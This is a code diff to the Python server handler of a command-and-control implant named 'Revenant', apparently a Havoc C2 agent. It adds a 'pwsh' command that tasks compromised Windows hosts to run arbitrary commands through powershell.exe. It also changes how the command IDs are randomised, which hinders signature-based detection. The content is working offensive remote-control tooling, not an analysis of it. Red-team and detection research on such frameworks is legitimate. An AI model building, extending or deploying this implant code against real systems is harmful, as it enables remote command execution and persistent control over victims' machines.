@@ -27,6 +27,7 @@ COMMAND_REGISTER = 0x100
 COMMAND_GET_JOB = 0x101
 COMMAND_NO_JOB = 0x102
 COMMAND_SHELL = 0x152
+COMMAND_PWSH = 0x111
 COMMAND_UPLOAD = 0x153
 COMMAND_DOWNLOAD = 0x154
 COMMAND_EXIT = 0x155
@@ -34,17 +35,18 @@ COMMAND_OUTPUT = 0x200
 
 
 def generate_command_constants():
+    rand_int = random.randint(0xF, 0xFFF0)
+    COMMAND_REGISTER = rand_int + 0x1
+    COMMAND_GET_JOB = rand_int + 0x2
+    COMMAND_NO_JOB = rand_int + 0x3
+    COMMAND_SHELL = rand_int + 0x4
+    COMMAND_PWSH = rand_int + 0x5
+    COMMAND_UPLOAD = rand_int + 0x6
+    COMMAND_DOWNLOAD = rand_int + 0x7
+    COMMAND_EXIT = rand_int + 0x8
+    COMMAND_OUTPUT = rand_int + 0x9
 
-    COMMAND_REGISTER = random.randint(0, 0xFFFF)
-    COMMAND_GET_JOB = random.randint(0, 0xFFFF)
-    COMMAND_NO_JOB = random.randint(0, 0xFFFF)
-    COMMAND_SHELL = random.randint(0, 0xFFFF)
-    COMMAND_UPLOAD = random.randint(0, 0xFFFF)
-    COMMAND_DOWNLOAD = random.randint(0, 0xFFFF)
-    COMMAND_EXIT = random.randint(0, 0xFFFF)
-    COMMAND_OUTPUT = random.randint(0, 0xFFFF)
-
-    return (COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT)
+    return (COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_PWSH,COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT)
 
 
 GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=4))
@@ -134,6 +136,7 @@ def write_command_header_file():
 #define COMMAND_GET_JOB          {COMMAND_GET_JOB}
 #define COMMAND_NO_JOB           {COMMAND_NO_JOB}
 #define COMMAND_SHELL            {COMMAND_SHELL}
+#define COMMAND_PWSH             {COMMAND_PWSH}
 #define COMMAND_UPLOAD           {COMMAND_UPLOAD}
 #define COMMAND_DOWNLOAD         {COMMAND_DOWNLOAD}
 #define COMMAND_EXIT             {COMMAND_EXIT}
@@ -201,6 +204,27 @@ def process_config_h(config: dict):
         with open(filepath, 'w') as f:
             f.write(header_file)
 
+class CommandPwsh(Command):
+    def __init__(self):
+        self.CommandId: int = COMMAND_PWSH
+        self.Name: str = "pwsh"
+        self.Description: str = "executes command using powershell.exe"
+        self.Help: str = ""
+        self.NeedAdmin: bool = False
+        self.Mitr: list = []
+        self.Params: list = [
+            CommandParam(
+                name="commands",
+                is_file_path=False,
+                is_optional=False
+            )
+        ]
+
+    def job_generate(self, arguments: dict) -> bytes:
+        task: Packer = Packer()
+        task.add_int(self.CommandId)
+        task.add_data("c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -c " + arguments['commands'])
+        return task.buffer
 
 class CommandShell(Command):
     def __init__(self):
@@ -318,6 +342,7 @@ class Revenant(AgentType):
             "RandCmdIds": False
         }
         self.Commands: list = [
+            CommandPwsh(),
             CommandShell(),
             CommandUpload(),
             CommandDownload(),
@@ -444,6 +469,7 @@ class Revenant(AgentType):
                                                              str(response_parser.parse_int())),
                     "OS Arch": response_parser.parse_int(),
                     "Sleep": response_parser.parse_int(),
+
                 }
 
                 registerinfo["Process Name"] = registerinfo["Process Path"].split("\\")[-1]
